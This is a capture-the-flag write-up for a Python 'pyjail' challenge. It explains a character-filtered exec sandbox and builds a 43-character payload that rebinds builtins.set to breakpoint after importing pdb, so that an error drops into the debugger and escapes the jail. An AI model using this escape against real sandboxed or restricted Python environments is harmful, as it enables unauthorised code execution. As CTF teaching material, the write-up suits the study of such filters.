# Golf

## Overview

We're given a file named chall.py, let's take a look at its content

```py
#!/usr/bin/env python3.13
if(c:=input()).isascii()*~-any(x in(c)for(x)in'!"#\'()*+-:<>@[]\\_{}'):exec(c[:43])
```

This is obviously a pyjail, and our goal is to read the flag from a file. First, let's rewrite this code in a more understandable way:

```py
#!/usr/bin/env python3.13

code = input()

if code.isascii() and not any(x in code for x in '!"#\'()*+-:<>@[]\\_{}'):
    exec(code[:43])
```

So that means we can only use the following characters ```?.,|^/`;=&~$%```. Fortunately for us, built-in functions are not erased, so we can still import modules and execute certain operations.

## Main Idea
The payload must be extremely short. Spawning a shell with so few characters is a challenging task, especially since we cannot directly call functions. To bypass this restriction, we can search for gadgets inside Python that will be triggered when an exception occurs.

The shortest way to trigger an exception is by referencing an undefined variable:

```py
>>> x
Traceback (most recent call last):
  File "<python-input-5>", line 1, in <module>
    x
NameError: name 'x' is not defined
```

Now we can try to overwrite some builtins to see if they're being called before throwing the exception. Our goal is to find a function that is invoked with no arguments so that we can overwrite it with `breakpoint`. A good candidate is `set`. Let's try overwriting it:

```py
import builtins;builtins.set = breakpoint;a

# Output:
  File "/slop.py", line 1, in <module>
    import builtins;builtins.set = breakpoint;a
NameError: name 'a' is not defined
```

This is strange. We know that `breakpoint` is being called because if we overwrite `set` with `print`, we can observe values and newlines being printed.

The `breakpoint` function imports the `pdb` module, which will  import other modules. To prevent `set` from being called before we intend it to, we must first import `pdb`.

## Final payload

```py
import pdb,builtins;builtins.set = breakpoint;a
```

This payload is still too long, so we have to shorten it:

```py
import pdb,builtins as e;e.set=breakpoint;a
```

This successfully breaks out of the jail and allows us to get the flag.